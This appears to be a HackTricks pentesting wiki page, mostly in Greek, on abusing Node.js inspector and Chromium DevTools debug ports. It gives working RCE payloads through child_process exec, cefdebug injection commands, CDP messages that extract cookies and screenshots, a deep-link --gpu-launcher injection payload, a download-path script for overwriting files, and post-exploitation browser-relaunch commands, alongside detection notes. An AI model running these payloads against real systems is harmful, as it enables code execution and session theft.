# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

Ιστορικά πρακτικά παραδείγματα περιλαμβάνουν το Multimaster walkthrough και την επίθεση στον debugger του Visual Studio Code μέσω του CVE-2019-1414· χρησιμοποιήστε τα ως version-specific πλαίσιο και όχι με την υπόθεση ότι κάθε σύγχρονος στόχος Electron ή Chromium εκθέτει τα ίδια primitives.<sup>[[1]](#references)[[3]](#references)</sup>

## Βασικές πληροφορίες

[Από την τεκμηρίωση](https://nodejs.org/learn/getting-started/debugging): Όταν ξεκινά με το switch `--inspect`, μια διεργασία Node.js ακούει για έναν debugging client. Από **προεπιλογή**, ακούει στη διεύθυνση host και port **`127.0.0.1:9229`**. Σε κάθε διεργασία εκχωρείται επίσης ένα **μοναδικό** **UUID**.<sup>[[4]](#references)</sup>

Οι Inspector clients πρέπει να γνωρίζουν και να καθορίζουν τη διεύθυνση host, το port και το UUID για να συνδεθούν. Ένα πλήρες URL θα μοιάζει κάπως έτσι: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Καθώς ο **debugger έχει πλήρη πρόσβαση στο περιβάλλον εκτέλεσης του Node.js**, ένας κακόβουλος παράγοντας που μπορεί να συνδεθεί σε αυτό το port ενδέχεται να μπορεί να εκτελέσει arbitrary code εκ μέρους της διεργασίας Node.js (**potential privilege escalation**).<sup>[[4]](#references)</sup>

Υπάρχουν διάφοροι τρόποι για να ξεκινήσει ένας inspector:<sup>[[4]](#references)</sup>
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Όταν εκκινείτε μια inspected process, θα εμφανιστεί κάτι σαν αυτό:<sup>[[4]](#references)</sup>
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Οι διεργασίες που βασίζονται στο **CEF** (**Chromium Embedded Framework**) μπορούν να εκθέσουν έναν debugger με `--remote-debugging-port=9222`. Αυτό εκθέτει το browser μέσω του [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) αντί για έναν Node.js inspector, επομένως τα payloads που βασίζονται στο Node.js `process` δεν εφαρμόζονται άμεσα από προεπιλογή.<sup>[[2]](#references)[[5]](#references)</sup>

Όταν εκκινείτε ένα browser με ενεργοποιημένο debugging, θα εμφανιστεί κάτι σαν το εξής:<sup>[[2]](#references)[[5]](#references)</sup>
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Enumerating και driving ενός CDP endpoint

Τα HTTP discovery endpoints διακρίνουν το **browser** WebSocket από τα WebSockets μεμονωμένων **target** (tab, worker, extension κ.λπ.). Υποβάλετε ερώτημα στο `/json/version` για το browser endpoint και στο `/json/list` για τα targets· οι τιμές `webSocketDebuggerUrl` που επιστρέφονται μπορούν στη συνέχεια να χρησιμοποιηθούν απευθείας με τα JSON-RPC-like messages του CDP.<sup>[[5]](#references)</sup>
```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```
Για παράδειγμα, συνδεθείτε με `websocat "$BROWSER_WS"` και στείλτε `{"id":1,"method":"Target.getTargets"}` ή `{"id":2,"method":"Storage.getCookies"}`. Σε ένα page target (`websocat "$PAGE_WS"`), το `Runtime.evaluate` εκτελείται σε αυτό το renderer και το `Page.captureScreenshot` επιστρέφει ένα screenshot encoded σε base64. Το `document.cookie` δεν μπορεί να αποκαλύψει cookies `HttpOnly`, ενώ το `Storage.getCookies` ζητά από τον browser το cookie store του.<sup>[[5]](#references)</sup>
```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```
### Browsers, WebSockets και same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Οι ιστότοποι που ανοίγουν σε ένα web-browser μπορούν να πραγματοποιούν αιτήματα WebSocket και HTTP σύμφωνα με το μοντέλο ασφάλειας του browser. Απαιτείται μια **αρχική σύνδεση HTTP** για την **απόκτηση ενός μοναδικού debugger session id**. Η **same-origin-policy** **εμποδίζει** τους ιστότοπους να πραγματοποιήσουν **αυτή τη σύνδεση HTTP**. Για πρόσθετη ασφάλεια έναντι [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** το Node.js επαληθεύει ότι τα **'Host' headers** για τη σύνδεση καθορίζουν είτε μια **IP address** είτε ακριβώς το **`localhost`**.<sup>[[4]](#references)</sup>

> [!TIP]
> Αυτό το **security measure αποτρέπει την εκμετάλλευση του inspector** για την εκτέλεση κώδικα με την **απλή αποστολή ενός HTTP request** (κάτι που θα μπορούσε να γίνει με την εκμετάλλευση ενός SSRF vuln).<sup>[[4]](#references)</sup>

### Εκκίνηση του inspector σε running processes

Μπορείτε να στείλετε το **signal SIGUSR1** σε μια running nodejs process, ώστε να **ξεκινήσει τον inspector** στο default port. Ωστόσο, σημειώστε ότι πρέπει να διαθέτετε επαρκή privileges, επομένως αυτό μπορεί να σας παραχωρήσει **privileged access σε πληροφορίες μέσα στη process**, αλλά όχι άμεσο privilege escalation.<sup>[[4]](#references)</sup>
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Αυτό είναι χρήσιμο σε containers, επειδή το **τερματισμός της διεργασίας και η εκκίνηση μιας νέας** με `--inspect` **δεν αποτελεί επιλογή**, καθώς το **container** θα **τερματιστεί** μαζί με τη διεργασία.<sup>[[6]](#references)</sup>

### Σύνδεση στο inspector/debugger

Για σύνδεση σε έναν **Chromium-based browser**, μπορείτε να αποκτήσετε πρόσβαση στα URLs `chrome://inspect` ή `edge://inspect` για το Chrome ή το Edge, αντίστοιχα. Κάνοντας κλικ στο κουμπί Configure, θα πρέπει να διασφαλιστεί ότι ο **target host και port** εμφανίζονται σωστά. Η εικόνα δείχνει ένα παράδειγμα Remote Code Execution (RCE):<sup>[[2]](#references)[[4]](#references)</sup>

![Μετά θα εμφανιστεί ένα URL για πρόσβαση στον debugger. π.χ. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Σύνδεση στο inspector/debugger: Για σύνδεση σε έναν Chromium-based browser,...](<../../images/image (674).png>)

Χρησιμοποιώντας τη **command line**, μπορείτε να συνδεθείτε σε έναν debugger/inspector με:<sup>[[2]](#references)[[4]](#references)</sup>
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Το εργαλείο [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) επιτρέπει να **εντοπίζει inspectors** που εκτελούνται τοπικά και να **κάνει inject code** σε αυτούς.<sup>[[2]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> Σημειώστε ότι τα **NodeJS RCE exploits δεν θα λειτουργήσουν** αν συνδεθείτε σε έναν browser μέσω του [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (πρέπει να ελέγξετε το API για να βρείτε ενδιαφέρουσες ενέργειες που μπορείτε να εκτελέσετε μέσω αυτού).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE in NodeJS Debugger/Inspector

> [!TIP]
> Αν αναζητάτε πληροφορίες σχετικά με το πώς να αποκτήσετε [**RCE from a XSS in Electron please check this page.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Μερικοί συνηθισμένοι τρόποι απόκτησης **RCE**, όταν μπορείτε να **συνδεθείτε** σε έναν Node **inspector**, είναι η χρήση κάτι σαν το παρακάτω (φαίνεται ότι αυτό **δεν θα λειτουργήσει σε σύνδεση με το Chrome DevTools protocol**):<sup>[[2]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

Μπορείτε να ελέγξετε το API εδώ: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
Σε αυτή την ενότητα θα παραθέσω απλώς ενδιαφέροντα πράγματα που έχω βρει ότι έχουν χρησιμοποιηθεί για την εκμετάλλευση αυτού του protocol.

### Περιορισμός default-profile στο Chrome 136+

Από το **Chrome 136** και έπειτα, το Chrome αγνοεί τα `--remote-debugging-port` και `--remote-debugging-pipe` όταν στοχεύουν τον **προεπιλεγμένο κατάλογο δεδομένων του Chrome**. Το switch πρέπει να συνδυάζεται με ένα μη τυπικό `--user-data-dir`, του οποίου το ξεχωριστό encryption key και η απομονωμένη κατάσταση browser αποτρέπουν την απλή τεχνική που βασίζεται σε flag από το να εκθέσει το κανονικό authenticated profile του χρήστη. Αυτός ο περιορισμός που αφορά ειδικά το Chrome δεν πρέπει να θεωρείται ότι καλύπτει παλαιότερα Chrome builds, το Chrome for Testing, εφαρμογές Electron/CEF ή άλλα παράγωγα του Chromium χωρίς επαλήθευση.<sup>[[14]](#references)</sup>
```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```
Therefore, το να βλέπουμε μια τρέχουσα διεργασία Chrome που εκκινήθηκε μόνο με το `--remote-debugging-port` **δεν** αποδεικνύει ότι το CDP ενεργοποιήθηκε. Επιβεβαιώστε τον listener και το `/json/version` και προσδιορίστε ποιο profile το υποστηρίζει στην πράξη.<sup>[[14]](#references)</sup>

### Parameter Injection via Deep Links

Στο [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) η Rhino security ανακάλυψε ότι μια εφαρμογή βασισμένη στο CEF **είχε καταχωρίσει ένα προσαρμοσμένο UR**I στο σύστημα (workspaces://index.html), το οποίο λάμβανε ολόκληρο το URI και στη συνέχεια **εκκινούσε την εφαρμογή βασισμένη στο CEF** με μια διαμόρφωση που κατασκευαζόταν εν μέρει από αυτό το URI.<sup>[[8]](#references)</sup>

Διαπιστώθηκε ότι οι παράμετροι του URI γίνονταν URL decoded και χρησιμοποιούνταν για την εκκίνηση της βασικής εφαρμογής CEF, επιτρέποντας σε έναν χρήστη να **inject** τη σημαία **`--gpu-launcher`** στη **γραμμή εντολών** και να εκτελέσει αυθαίρετες ενέργειες.<sup>[[8]](#references)</sup>

Έτσι, ένα payload όπως:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Θα εκτελέσει το calc.exe.<sup>[[8]](#references)</sup>

### Αντικατάσταση αρχείων

Άλλαξε τον φάκελο όπου θα αποθηκεύονται τα **downloaded files** και κατέβασε ένα αρχείο για να **overwrite** τον συχνά χρησιμοποιούμενο **source code** της εφαρμογής με τον **malicious code** σου.<sup>[[5]](#references)[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE και exfiltration

Τα STAR Labs έδειξαν ότι οι εκτεθειμένες υπηρεσίες WebDriver/CDP μπορούν να επιτρέψουν αυθαίρετες αναγνώσεις αρχείων και RCE· το DNS rebinding μπορεί να ολοκληρώσει την exploit chain σε ορισμένες διαμορφώσεις.<sup>[[9]](#references)</sup>

Για επιπλέον ιστορικές περιπτώσεις browser-automation και ασφάλειας του Chromium, δείτε το write-up του Counter WebDriver και τα issues 773, 1742 και 1944 του Project Zero.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Ενεργοποίηση του CDP μέσα σε μια ενεργή διαδικασία Chromium

Στα Windows, το [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) έδειξε ότι ο περιορισμός της γραμμής εντολών δεν είναι ο μόνος τρόπος ενεργοποίησης του CDP: κώδικας που μπορεί ήδη να κάνει inject σε ένα υπάρχον `msedge.exe` μπορεί να καλέσει το μη εξαγόμενο Chromium `content::DevToolsAgentHost::StartRemoteDebuggingServer` και να εκθέσει το authenticated live profile χωρίς επανεκκίνηση του browser.<sup>[[15]](#references)</sup>

Η demonstrated chain κάνει inject ένα DLL με `VirtualAllocEx`/`WriteProcessMemory`/`CreateRemoteThread`, επιλύει internal Edge symbols (αρχικά από PDBs και στη συνέχεια με version-specific byte signatures), κάνει subclass το παράθυρο του browser και στέλνει ένα message ώστε η τελική κλήση εκκίνησης του server να εκτελεστεί στο **UI thread** του browser. Το socket γίνεται bind στο loopback, μετά το οποίο τα κανονικά CDP primitives μπορούν να ανακτήσουν cookies, να καταγράψουν tabs, να επιθεωρήσουν network traffic ή να κάνουν evaluate JavaScript σε authenticated pages.<sup>[[15]](#references)</sup>

> [!WARNING]
> Πρόκειται για τεχνική **post-compromise/process-injection**, όχι για unauthenticated network bypass. Εξαρτάται σε μεγάλο βαθμό από το build, επειδή τα σχετικά C++ symbols δεν είναι exported και τα signatures μπορούν να αλλάξουν μετά από browser updates.<sup>[[15]](#references)</sup>

Για detection, μην βασίζεστε μόνο σε telemetry της γραμμής εντολών `--remote-debugging-*`: συσχετίστε επίσης ασυνήθιστα handles και memory operations εναντίον browser processes (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, δημιουργία threads), DLL injection και απροσδόκητα loopback listening sockets που ανήκουν σε Chrome/Edge.<sup>[[15]](#references)</sup>

### Post-Exploitation

Σε ένα πραγματικό περιβάλλον και **μετά το compromising** ενός user PC που χρησιμοποιεί browser βασισμένο στο Chromium, μια ιστορική τεχνική ήταν η επανεκκίνηση του browser με ενεργοποιημένο debugging και η προώθηση της loopback port. Αυτό μπορεί να εκθέσει το browsing state του θύματος σε προϊόντα/builds που εξακολουθούν να αποδέχονται το επιλεγμένο profile, όμως το Chrome 136+ δεν θα το εφαρμόσει στον προεπιλεγμένο data directory του.<sup>[[7]](#references)[[14]](#references)</sup>

Η αρχική εντολή επανεκκίνησης διατηρείται παρακάτω για παλαιότερα/version-specific targets. Η δεύτερη εντολή είναι η υποστηριζόμενη τρέχουσα μορφή για το Chrome, αλλά δημιουργεί ένα isolated profile αντί να ανοίξει ξανά το κανονικό authenticated state του θύματος.<sup>[[7]](#references)[[14]](#references)</sup>
```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```
Για tradecraft ειδικά για macOS σχετικά με relaunch, extensions και CDP του Chromium, δείτε το [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md).



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - εργαλείο επιθεώρησης και exploitation του CEF/Chromium debugger](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Remote Code Execution του Visual Studio Code μέσω του Chrome DevTools Debugger](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Οδηγός debugging του Node.js - Ξεκινώντας](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Κατάχρηση της λειτουργίας debugging του Chrome για απομακρυσμένη παρατήρηση και έλεγχο sessions περιήγησης](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: Remote Code Execution στο AWS WorkSpaces](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [Μιλάς σε μένα; - WebDriver RCE μέσω DNS Rebinding και CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - Από Bot σε RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [Αλλαγές στα remote debugging switches για βελτίωση της ασφάλειας - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [Injecting CDP into a Running Edge Browser: Μια εις βάθος ανάλυση του Runtime Browser Instrumentation](https://deathflamingo.com/blog/cdp_enabler/)
{{#include ../../banners/hacktricks-training.md}}
